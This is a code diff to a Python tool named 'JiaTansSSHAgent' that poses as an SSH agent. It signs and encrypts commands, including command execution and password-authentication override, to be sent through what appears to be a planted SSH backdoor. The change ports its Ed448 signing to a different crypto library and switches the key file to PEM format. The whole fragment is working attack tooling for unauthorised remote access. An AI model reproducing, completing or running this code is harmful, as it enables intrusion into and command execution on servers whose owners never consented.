@@ -4,8 +4,9 @@ import socket
 import struct
 import hashlib
 
-from cryptography.hazmat.primitives.asymmetric.ed448 import Ed448PrivateKey
 from Crypto.Cipher import ChaCha20
+from Crypto.PublicKey import ECC
+from Crypto.Signature import eddsa
 
 BACKDOOR2_CMD_OVERRIDE_MONITOR_AUTHPASSWORD_RESPONSE = 0x01
 BACKDOOR2_CMD_EXEC_COMMAND = 0x03
@@ -25,11 +26,9 @@ def pad(v, n, b=b"\x00"):
 
 class JiaTansSSHAgent:
     def __init__(self, path, ed448_keyfile):
-        self.ed448_privkey = Ed448PrivateKey.from_private_bytes(
-            open(ed448_keyfile, "rb").read()
-        )
+        self.ed448_privkey = ECC.import_key(open(ed448_keyfile).read())
         self.ed448_pubkey = self.ed448_privkey.public_key()
-        self.ed448_pubkey_bytes = self.ed448_pubkey.public_bytes_raw()
+        self.ed448_pubkey_bytes = self.ed448_pubkey.export_key(format="raw")
 
         self.session_id = None
         self.hostkey_pub = None
@@ -38,6 +37,10 @@ class JiaTansSSHAgent:
         self.server.listen(1)
         print("")
         print("[i] waiting for ssh agent requests..")
+
+    def sign(self, blob):
+        signer = eddsa.new(self.ed448_privkey, "rfc8032")
+        return signer.sign(blob)
 
     def sshbuf_unchunk(self, buf):
         o = []
@@ -100,7 +103,7 @@ class JiaTansSSHAgent:
         sig_buf += bytes(flags)
         sig_buf += args
         sig_buf += self.hostkey_pub
-        sig_out = self.ed448_privkey.sign(sig_buf)
+        sig_out = self.sign(sig_buf)
         o = hdr + self.chacha20_crypt(
             self.ed448_pubkey_bytes[0:32], hdr[0:0x10], sig_out + payload
         )
@@ -132,7 +135,7 @@ class JiaTansSSHAgent:
         MAGIC_CHUNK_SIZE = 0x100
 
         p = self.ed448_pubkey_bytes + bytes([cmd_id])
-        p += self.ed448_privkey.sign(p + self.hostkey_pub)
+        p += self.sign(p + self.hostkey_pub)
 
         body = struct.pack("<H", len(body)) + body
         p += body
@@ -142,7 +145,7 @@ class JiaTansSSHAgent:
         signature2_buf = (
             struct.pack("<H", MAGIC_SIZE) + p + self.session_id + self.hostkey_pub
         )
-        p += self.ed448_privkey.sign(signature2_buf)
+        p += self.sign(signature2_buf)
 
         p += b"\x00\x00"
         p = struct.pack("<H", len(p)) + p
@@ -230,7 +233,7 @@ if __name__ == "__main__":
     banner()
 
     if len(sys.argv) != 3:
-        print("usage: %s <socket_path> <ed448_privkey.bin>\n" % sys.argv[0])
+        print("usage: %s <socket_path> <ed448_privkey.pem>\n" % sys.argv[0])
         exit(-1)
 
     agent_socket, privkey_path = sys.argv[1:]
